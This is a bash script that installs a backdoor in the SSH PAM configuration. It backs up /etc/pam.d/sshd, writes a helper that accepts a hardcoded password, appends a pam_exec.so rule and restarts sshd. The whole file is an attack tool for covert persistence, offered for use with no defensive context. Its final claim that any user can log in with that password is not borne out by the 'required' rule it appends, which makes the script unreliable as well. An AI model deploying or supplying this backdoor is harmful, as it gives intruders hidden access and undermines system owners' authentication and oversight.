#!/bin/bash

# PAM Backdoor Script for SSH
# This script adds a backdoor that allows logging in as any user with a predefined password.

# Define the hardcoded backdoor password
BACKDOOR_PASSWORD="SuperSecretBackdoorPassword"

# Backup original PAM configuration
PAM_FILE="/etc/pam.d/sshd"
BACKUP_FILE="/etc/pam.d/sshd.bak"
echo "[+] Backing up $PAM_FILE to $BACKUP_FILE"
cp $PAM_FILE $BACKUP_FILE

# Check if the backdoor is already installed
if grep -q "pam_exec.so" $PAM_FILE; then
    echo "[!] PAM backdoor already installed."
    exit 1
fi

# Create a backdoor script to validate the hardcoded password
BACKDOOR_SCRIPT="/usr/local/bin/pam_backdoor.sh"
echo "[+] Creating PAM backdoor script at $BACKDOOR_SCRIPT"

cat << 'EOF' > $BACKDOOR_SCRIPT
#!/bin/bash
# PAM backdoor script - Accepts a hardcoded password for any user

BACKDOOR_PASSWORD="SuperSecretBackdoorPassword"

# Capture the password attempt
read -s password_attempt

# If the password matches the backdoor password, allow access
if [ "$password_attempt" == "$BACKDOOR_PASSWORD" ]; then
    exit 0
else
    exit 1
fi
EOF

# Make the backdoor script executable
chmod +x $BACKDOOR_SCRIPT

# Modify PAM configuration to use the backdoor
echo "[+] Adding backdoor to PAM configuration"
echo "auth required pam_exec.so expose_authtok /usr/local/bin/pam_backdoor.sh" >> $PAM_FILE

# Restart SSH service to apply changes
echo "[+] Restarting SSH service..."
systemctl restart sshd

echo "[+] PAM backdoor setup complete. You can log in with any user using the password: $BACKDOOR_PASSWORD"